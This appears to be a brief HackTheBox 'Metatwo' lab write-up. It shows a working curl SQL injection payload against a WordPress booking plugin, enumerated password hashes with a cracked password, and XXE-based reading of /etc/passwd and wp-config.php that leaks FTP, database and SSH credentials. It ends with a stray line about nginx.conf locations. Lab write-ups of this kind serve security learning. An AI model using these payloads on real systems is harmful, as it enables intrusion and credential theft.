https://0xdedinfosec.vercel.app/blog/hackthebox-metatwo-writeup

# Metatwo


# 1. Malicious plugin allows sqli

Wordpress vuln: https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
-> plugin allows SQLi:
```
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=6a1e5a8e90&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```


Enumerated user:

```
User: manager
Password hash: $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
Password plain: partylikearockstar
ID:  2
```

```
User:  admin
Password:  $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
ID:  1
```

- User `manager` can login into the wordpress backend

# 2. Vulnerable wp version allows LFI via authenticated XXE
- `cve-2021-29447`
- leaked `/etc/passswd` reveals user `jnelson`
- leaked nginx default site config `/etc/nginx/sites-enabled/default`
    - application root is `/var/www/metapress.htb/blog`
    - found wp config `/var/www/metapress.htb/blog/wp-config.php`
        - this file leaks ftp credentials: `metapress.htb/9NYS_ii@FyL_p5M2NvJ`
        - this file leaks db credentials: `blog/635Aq@TdqrCwXFUZ`
  
# 3. Enumerate ftp
- found file `send_email.php` which contains a password for user `jnelson/Cb4_JmWM8zUZWMu@Ys`
- allows login vis ssh to obtain user flag

nginx.conf and placed in the directory /usr/local/nginx/conf , /etc/nginx , or /usr/local/etc/nginx